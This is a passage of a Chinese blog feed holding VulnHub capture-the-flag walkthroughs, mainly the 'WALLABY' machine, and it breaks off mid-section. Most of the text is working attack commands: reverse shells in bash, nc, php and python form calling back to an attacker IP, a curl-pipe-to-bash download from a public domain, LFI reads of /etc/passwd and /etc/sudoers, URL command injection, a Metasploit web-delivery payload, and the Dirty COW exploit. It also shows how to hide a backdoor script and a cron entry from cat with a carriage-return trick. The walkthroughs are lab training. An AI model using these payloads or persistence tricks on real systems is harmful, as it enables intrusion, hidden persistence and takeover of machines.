data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3N3aXNza3lyZXBvL1BheWxvYWRzQWxsVGhlVGhpbmdzL2Jsb2IvbWFzdGVyL01ldGhvZG9sb2d5JTIwYW5kJTIwUmVzb3VyY2VzL1JldmVyc2UlMjBTaGVsbCUyMENoZWF0c2hlZXQubWQjYw==\">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Reverse Shell Cheatsheet.md#c</span></p>\n<p>重新编辑 supersecretfileuc.c 这个文件<br>\n<img data-src=\"/N1h1l157/VULNHUB/image-223.png\" alt></p>\n<p>并在 4444 端口出监听<br>\n<img data-src=\"/N1h1l157/VULNHUB/image-224.png\" alt></p>\n<p>-&gt; 至此拿到了 root 权限，提权成功</p>\n<h3 id=\"cat配合cron维权\"><a class=\"markdownIt-Anchor\" href=\"#cat配合cron维权\">#</a> cat 配合 cron 维权</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">编写python程序显示如下内容：</span><br><span class=\"line\">evil = &quot;bash -i &gt;&amp; /dev/tcp/192.168.31.135/4444 0&gt;&amp;1&quot;</span><br><span class=\"line\">normal = &quot;echo &#x27;Hello world!&#x27;&quot;</span><br><span class=\"line\">with open(&quot;/root/.test.sh&quot;, &quot;w&quot;) as f:</span><br><span class=\"line\">\toutput = &quot;#!/bin/bash\\n&quot;</span><br><span class=\"line\">\toutput += normal + &quot;;&quot; + evil + &quot; #\\r&quot; + normal + &quot; &quot; * (len(evil) + 3) + &quot;\\n&quot;</span><br><span class=\"line\">\tf.write(output)</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-225.png\" alt></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 -m http.server 80</span><br><span class=\"line\">wget 192.168.31.135/1.py</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-226.png\" alt></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">用py执行此文件后，会生成 /root/.test.sh</span></span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">使用<span class=\"built_in\">cat</span>看的时候看不到 payload，但使用more 或者 <span class=\"built_in\">cat</span> -A 就会暴露</span></span><br><span class=\"line\"></span><br><span class=\"line\">rm -f 1.py &amp;&amp; chmod +x /root/.test.sh</span><br><span class=\"line\">mv /root/test.sh /root/.test.sh &amp;&amp; /root/.test.sh</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-227.png\" alt></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">成功反弹出去，实现了cat隐藏木马,将此文件加入到计划文件中：</span><br><span class=\"line\">(crontab - l;printf &quot;*/1 * * * * /root/.test.sh;\\rno crontab for `whoami`%100c\\n&quot;)|crontab -</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-228.png\" alt></p>\n<p>-&gt; cron 中同样是被隐藏的计划任务，只要我们 nc -lvvp 4449 等待上线即可</p>\n",
            "tags": [
                "VULNHUB 1-10"
            ]
        },
        {
            "id": "https://n1h1l157.github.io/2021/11/01/VULNHUB/109%20WALLABY/",
            "url": "https://n1h1l157.github.io/2021/11/01/VULNHUB/109%20WALLABY/",
            "title": "VULNHUB 9 WALLABY",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvd2FsbGFieXMtbmlnaHRtYXJlLXYxMDIsMTc2Lw==\">https://www.vulnhub.com/entry/wallabys-nightmare-v102,176/</span><br>\n 教程链接地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1L2FydGljbGUvZGV0YWlscy8xMDQwOTUwMjk=\">https://blog.csdn.net/qq_34801745/article/details/104095029</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.31.135<br>\n 靶机 NAPPING：桥接于 192.168.31.1 的网卡，ip 未知</p>\n<ol>\n<li>\n<p>通过 netdiscover 扫描当前网卡里边有哪些机器<br>\n <code>sudo netdiscover -i eth0 -r 192.168.31.0/24</code></p>\n</li>\n<li>\n<p>将所有已知的 ip 暂时存档，对这类 ip 地址不做端口扫描</p>\n</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">shell</span></span><br><span class=\"line\">cat &gt; myip.txt &lt;&lt; EOF</span><br><span class=\"line\">192.168.31.1 192.168.31.25 192.168.31.58 192.168.31.86 192.168.31.33</span><br><span class=\"line\">192.168.31.120 192.168.31.135 192.168.31.145 192.168.31.162 192.168.31.44</span><br><span class=\"line\">EOF</span><br></pre></td></tr></table></figure>\n<ol start=\"3\">\n<li>去除一些已知 ip 的机器，对剩余 IP 进行端口扫描，判断目标 IP<br>\n <code>sudo nmap -PA 192.168.31.107 --excludefile myip.txt</code></li>\n</ol>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-150.png\" alt></p>\n<p>-&gt; 目标机器的 ip 地址： 192.168.31.5</p>\n<ol start=\"4\">\n<li>确认靶机 ip 开放的端口信息</li>\n</ol>\n<p><code>sudo nmap -A -p- 192.168.31.15 -oN /tmp/wallaby.txt</code></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-151.png\" alt></p>\n<p>-&gt; 靶机开放端口 22, 80, 6667</p>\n<h3 id=\"lfi-漏洞测试\"><a class=\"markdownIt-Anchor\" href=\"#lfi-漏洞测试\">#</a> LFI 漏洞测试</h3>\n<ol>\n<li>打开 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuNS8=\">http://192.168.31.5/</span> 进行信息收集</li>\n</ol>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-152.png\" alt></p>\n<p>输入名字并登陆此网站</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-153.png\" alt></p>\n<p>观察 url 地址，发现存在 lfi 本地文件包含漏洞</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-154.png\" alt></p>\n<p>直接构造 http://192.168.31.5/?page=/etc/passwd</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-155.png\" alt></p>\n<p>访问 http://192.168.31.5/?page=/etc/sudoers 发现对方管理员检测到了 lfi 攻击</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-156.png\" alt></p>\n<p>重新访问 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuNS8=\">http://192.168.31.5/</span> 发现网站已经挂掉了</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-157.png\" alt></p>\n<p>-&gt; 80 端口被关闭，网站已被注销，重新尝试端口扫描</p>\n<h3 id=\"60080-网站信息收集\"><a class=\"markdownIt-Anchor\" href=\"#60080-网站信息收集\">#</a> 60080 网站信息收集</h3>\n<p>重新扫描端口，发现 80 被关闭，新开了一个 60080 端口网站<br>\n<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuNTo2MDA4MC8=\"> http://192.168.31.5:60080/</span> 渗透测试</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-158.png\" alt></p>\n<p>发现此端口确实存在网站，目标转为对此网站的分析</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-159.png\" alt></p>\n<p>目录爆破，收集更多的目录信息</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dirsearch -u http://192.168.31.5:60080/</span><br><span class=\"line\">gobuster dir -u http://192.168.31.5:60080/ - w /usr/share/dirbuster/wordlists/directory-</span><br><span class=\"line\">list-2.3-medium.txt -x php,txt,html</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-160.png\" alt></p>\n<p>并没有发现任何有价值的信息</p>\n<h3 id=\"dirb-目录扫描\"><a class=\"markdownIt-Anchor\" href=\"#dirb-目录扫描\">#</a> dirb 目录扫描</h3>\n<p>仔细回想之前的操作，在 80 端口对网站渗透时，发现了 lfi 漏洞<br>\n是在 http://192.168.31.5/?page=home 上的，尝试访问 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuNTo2MDA4MC8/cGFnZT1ob21l\">http://192.168.31.5:60080/?page=home</span> 仍存在 lfi 漏洞</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-161.png\" alt></p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuNTo2MDA4MC8/cGFnZT0vZXRjL3N1ZG9lcnM=\">http://192.168.31.5:60080/?page=/etc/sudoers</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-162.png\" alt></p>\n<p>使用 dirb 对 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuNTo2MDA4MC8/cGFnZT0=\">http://192.168.31.5:60080/?page=</span> 目录进行扫描</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">dirb是一个基于字典的web目录扫描工具，查找现有的（和/或隐藏的）Web对象，通过对Web服务器发起基于字典的攻击并分析响应的数据。</span></span><br><span class=\"line\">dirb http://192.168.31.5:60080/index.php?page=</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-163.png\" alt></p>\n<p>-&gt; 敏感网址：<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuNTo2MDA4MC9pbmRleC5waHA/cGFnZT1tYWlsZXI=\">http://192.168.31.5:60080/index.php?page=mailer</span></p>\n<p>将这些文件访问了一遍之后，发现此网站是唯一可能存在漏洞的目标</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-164.png\" alt></p>\n<p>检查源代码，发现这里有一个 rce 漏洞</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-165.png\" alt></p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuNTo2MDA4MC9pbmRleC5waHA/cGFnZT1tYWlsZXImYW1wO21haWw9bWFpbA==\">http://192.168.31.5:60080/index.php?page=mailer&amp;mail=mail</span><br>\n<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuNTo2MDA4MC9pbmRleC5waHA/cGFnZT1tYWlsZXImYW1wO21haWw9bHM=\">http://192.168.31.5:60080/index.php?page=mailer&amp;mail=ls</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-166.png\" alt></p>\n<h3 id=\"phpcurlbashnc-反弹\"><a class=\"markdownIt-Anchor\" href=\"#phpcurlbashnc-反弹\">#</a> php/curl/bash/nc 反弹</h3>\n<p>判断目标服务器上是否存在相关的命令<br>\n<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuNTo2MDA4MC9pbmRleC5waHA/cGFnZT1tYWlsZXImYW1wO21haWw9d2hpY2glMjBjdXJs\"> http://192.168.31.5:60080/index.php?page=mailer&amp;mail=which%20curl</span><br>\n<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuNTo2MDA4MC9pbmRleC5waHA/cGFnZT1tYWlsZXImYW1wO21haWw9d2hpY2glMjBweXRob24=\">http://192.168.31.5:60080/index.php?page=mailer&amp;mail=which%20python</span><br>\n<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuNTo2MDA4MC9pbmRleC5waHA/cGFnZT1tYWlsZXImYW1wO21haWw9d2hpY2glMjBwaHA=\">http://192.168.31.5:60080/index.php?page=mailer&amp;mail=which%20php</span><br>\n<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuNTo2MDA4MC9pbmRleC5waHA/cGFnZT1tYWlsZXImYW1wO21haWw9d2hpY2glMjBuYw==\">http://192.168.31.5:60080/index.php?page=mailer&amp;mail=which%20nc</span></p>\n<p>也可以直接一句话判断所有的信息：<br>\n<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuNTo2MDA4MC9pbmRleC5waHA/cGFnZT1tYWlsZXImYW1wO21haWw9d2hpY2glMjBjdXJsO3doaWNoJTIwcGhwO3doaWNoJTIwcHl0aG9uO3doaWNoJTIwYmFzaDs=\">http://192.168.31.5:60080/index.php?page=mailer&amp;mail=which curl;which php;which python;which bash;</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-167.png\" alt></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">根据收集到的服务器上的信息进行反弹shell</span></span><br><span class=\"line\">php -r &#x27;$sock=fsockopen(&quot;192.168.31.135&quot;,4444);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br><span class=\"line\">curl http://www.chentuo.asia/shell.sh | bash (success)</span><br><span class=\"line\">bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.31.135/4444 0&gt;&amp;1&#x27;</span><br><span class=\"line\">bash -i &gt;&amp; /dev/tcp/192.168.31.135/4445 0&gt;&amp;1</span><br><span class=\"line\">nc 192.168.31.135 4444 -e /bin/bash</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-168.png\" alt></p>\n<h3 id=\"kali-php木马反弹\"><a class=\"markdownIt-Anchor\" href=\"#kali-php木马反弹\">#</a> kali php 木马反弹</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cp /usr/share/webshells/php/php-reverse-shell.php shell.php</span><br><span class=\"line\">vim shell.php 将默认端口改为kali的ip和端口号</span><br><span class=\"line\">python 3 -m http.server 80</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">构造如下url执行php</span></span><br><span class=\"line\">http://192.168.31.5:60080/index.php?page=mailer&amp;mail=wget%20http://192.168.31.135/shell.php;%20chmod%20777%20shell.php;%20ls%20-al</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-169.png\" alt></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">也可以将shell.php发送到有公网ip的网站上让目标机器去访问远程url地址上的payload并反弹shell</span></span><br><span class=\"line\">scp -P 2121 shell.php root@1.117.52.219:/data/wwwroot/www.chentuo.asia/shell.php</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">构造如下url执行php</span></span><br><span class=\"line\">http://192.168.31.5:60080/index.php?page=mailer&amp;mail=wget%20http://www.chentuo.asia/shell.php;%20chmod%20777%20shell.php;%20ls%20-al</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>上述的方法下载下来的 shell.php 是空文件，默认不允许下载此类文件</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">在服务器上操作 <span class=\"built_in\">cp</span> shell.php shell.txt,下载后重命名即可,构造如下url执行php</span></span><br><span class=\"line\">http://192.168.31.5:60080/index.php?page=mailer&amp;mail=wget%20http://www.chentuo.asia/shell.txt;mv%20shell.txt%20shell.php%20chmod%20777%20shell.php;%20ls%20-al</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">监听本地的 4444 端口，并且同时运行此shell.php文件</span></span><br><span class=\"line\">[http://192.168.31.5:60080/shell.php](http://192.168.31.5:60080/shell.php)</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-170.png\" alt></p>\n<h3 id=\"python反弹shell\"><a class=\"markdownIt-Anchor\" href=\"#python反弹shell\">#</a> python 反弹 shell</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">python 反弹shell代码</span></span><br><span class=\"line\">python -c &#x27;import socket,subprocess,os;</span><br><span class=\"line\">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.31.135 &quot;,4444));</span><br><span class=\"line\">os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);</span><br><span class=\"line\">os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">构造地址</span></span><br><span class=\"line\">http://192.168.31.5:60080/index.php?page=mailer&amp;mail=python%20-c%20%27import%20socket,subprocess,os;%20s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.31.135%22,4444));%20os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/bash%22,%22-i%22]);%27</span><br></pre></td></tr></table></figure>\n<p>如果页面有 html 限制，在审查元素中修改即可</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-171.png\" alt></p>\n<h3 id=\"msf生成php反弹\"><a class=\"markdownIt-Anchor\" href=\"#msf生成php反弹\">#</a> msf 生成 php 反弹</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">msf生成php木马</span></span><br><span class=\"line\">use exploit/multi/script/web_delivery</span><br><span class=\"line\">set target 1</span><br><span class=\"line\">set payload php/meterpreter/reverse_tcp</span><br><span class=\"line\">set lhost 192.168.31.135</span><br><span class=\"line\">set lport 4444</span><br><span class=\"line\">run</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">将msf生成的php反弹shell的代码直接粘贴在url地址上即可</span></span><br><span class=\"line\">http://192.168.31.5:60080/index.php?page=mailer&amp;mail=php%20-d%20allow_url_fopen=true%20-</span><br><span class=\"line\"><span class=\"meta prompt_\">r%</span><span class=\"language-bash\">20%22eval(file_get_contents(%27http://192.168.31.135:8080/Dk00YRQ%27,%20false,%20stream_context_create([%27ssl%27=%3E[%27verify_peer%27=%3Efalse,%27verify_peer_name%27=%3Efalse]])));%22</span></span><br></pre></td></tr></table></figure>\n<p>在此阶段，不要退出 msf，只要 msf 在线，生成的 php 代码运行之后，msf 就会接收到 sessions</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-172.png\" alt></p>\n<h3 id=\"stty-异常处理\"><a class=\"markdownIt-Anchor\" href=\"#stty-异常处理\">#</a> stty 异常处理</h3>\n<p>注意使用 msf 的时候如果也用了 stty 会出现下面这个问题</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-173.png\" alt></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">即enter键被转化为了^M 此时再输入任何命令都无法执行了</span><br><span class=\"line\">哪怕重启msf也无效，这里需要先退出msf，并执行stty sane，可将问题解决</span><br><span class=\"line\">命令sane最常出现在大多数终端的stty选项的集合中，它并不改变通信信道</span><br><span class=\"line\">的速率，但当终端发生混乱时，通常能够产生有益的效果。</span><br></pre></td></tr></table></figure>\n<h3 id=\"权限移到另一shell\"><a class=\"markdownIt-Anchor\" href=\"#权限移到另一shell\">#</a> 权限移到另一 shell</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">当前终端：</span></span><br><span class=\"line\">python3 -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br><span class=\"line\">bash -i &gt;&amp; /dev/tcp/192.168.31.135/4445 0&gt;&amp;1</span><br><span class=\"line\">nc - lvvp 4445</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">新的终端：</span></span><br><span class=\"line\">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class=\"line\">stty raw -echo;fg</span><br><span class=\"line\">export TERM=xterm</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-174.png\" alt></p>\n<h3 id=\"sudovim提权\"><a class=\"markdownIt-Anchor\" href=\"#sudovim提权\">#</a> sudo (vim) 提权</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo -l 发现使用waldo执行vim可以免密</span><br><span class=\"line\">sudo -u waldo /usr/bin/vim /etc/apache2/sites-available/000-default.conf</span><br><span class=\"line\">esc --&gt; :!/bin/bash</span><br><span class=\"line\">esc --&gt; :!bash -i &gt;&amp; /dev/tcp/192.168.31.135/4447 0&gt;&amp;1 可拿到反弹shell</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-175.png\" alt></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-176.png\" alt></p>\n<h3 id=\"脏牛提权\"><a class=\"markdownIt-Anchor\" href=\"#脏牛提权\">#</a> 脏牛提权</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget https://github.com/firefart/dirtycow/archive/refs/heads/master.zip</span><br><span class=\"line\">scp -r parallels@192.168.31.135:~/Desktop/tool/dirtycow/dirtycow-master /tmp</span><br><span class=\"line\">cd dirtycow-master</span><br><span class=\"line\">gcc -pthread dirty.c -o dirty -lcrypt</span><br><span class=\"line\">./dirty</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-177.png\" alt><br>\n服务器崩溃，提权失败，需要重启服务器</p>\n<h3 id=\"issri-攻击-irc\"><a class=\"markdownIt-Anchor\" href=\"#issri-攻击-irc\">#</a> issri 攻击 irc</h3>\n<ol>\n<li>修改防火墙规则，允许链接 irc<br>\n 在 www-data 用户的时候，发现可以直接调用 root 改变 iptables</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">查看当前的防火墙规则</span></span><br><span class=\"line\">sudo iptables -L</span><br><span class=\"line\"></span><br><span class=\"line\">同由于它是一个易受攻击的机器，我们看到我们从外部发送到irc的包通过使,用授予所有用户的管理 iptables 的权限被丢弃，我们删除了这个丢弃规则。</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">重写第二条规则以允许端口 6667 上的 TCP 连接</span></span><br><span class=\"line\">sudo iptables -R INPUT 2 -p tcp --dport 6667 -j ACCEPT</span><br><span class=\"line\">sudo iptables -L</span><br><span class=\"line\"></span><br><span class=\"line\">而在nmap扫描端口时也出现了 6667 irc服务</span><br><span class=\"line\">改变iptables之后我们可以通过irssi连接到irc</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-178.png\" alt></p>\n<ol start=\"2\">\n<li>\n<p>issri 连接至 irc<br>\n <code>irssi -c 192.168.31.5 -p 6667 列出频道 /list</code> <br>\n<img data-src=\"/N1h1l157/VULNHUB/image-179.png\" alt></p>\n</li>\n<li>\n<p>加入了 wallabyschat 频道 /join #wallabyschat<br>\n<img data-src=\"/N1h1l157/VULNHUB/image-180.png\" alt></p>\n</li>\n<li>\n<p>列出选项 .help<br>\n<img data-src=\"/N1h1l157/VULNHUB/image-181.png\" alt></p>\n</li>\n<li>\n<p>查看私密信息 /window 3<br>\n<img data-src=\"/N1h1l157/VULNHUB/image-182.png\" alt></p>\n</li>\n<li>\n<p>看到 run 似乎有用，返回 /window 2, 执行 run<br>\n<img data-src=\"/N1h1l157/VULNHUB/image-183.png\" alt></p>\n</li>\n</ol>\n<p>只有 waldo 才能执行，我们换名字 /nick waldo<br>\n 此时更名不成功，因为正有 waldo 用户的进程 tmux 使用着</p>\n<ol start=\"7\">\n<li>伪造身份登陆 irssi</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">通过sudo -l中的vim权限设置错误提升权限</span><br><span class=\"line\">sudo -u waldo /usr/bin/vim /etc/apache2/sites-available/000-default.conf</span><br><span class=\"line\">esc --&gt; :!/bin/bash 提权至waldo权限</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-184.png\" alt></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">这里有一个irssi.sh的文件，会以waldo的身份运行shell</span><br><span class=\"line\">他的设置有问题。如果 Tmux 宕机，他的 IRC 连接也会宕机。</span><br><span class=\"line\">pkill tmux</span><br><span class=\"line\">who</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-185.png\" alt></p>\n<ol start=\"8\">\n<li>\n<p>在 irssi 中修改别名为 waldo：/nick waldo<br>\n<img data-src=\"/N1h1l157/VULNHUB/image-186.png\" alt></p>\n</li>\n<li>\n<p>现在我们用 waldo 身份来运行 run 看会有什么效果<br>\n<img data-src=\"/N1h1l157/VULNHUB/image-187.png\" alt></p>\n</li>\n</ol>\n<h3 id=\"suid-python提权\"><a class=\"markdownIt-Anchor\" href=\"#suid-python提权\">#</a> SUID python 提权</h3>\n<p>可以看到的是，我们用 run 执行命令的时候调用的是 wallabyshot 的身份<br>\n我们可以构造 payload 尝试将 wallabyshot 身份的 shell 反弹出来</p>\n<figure 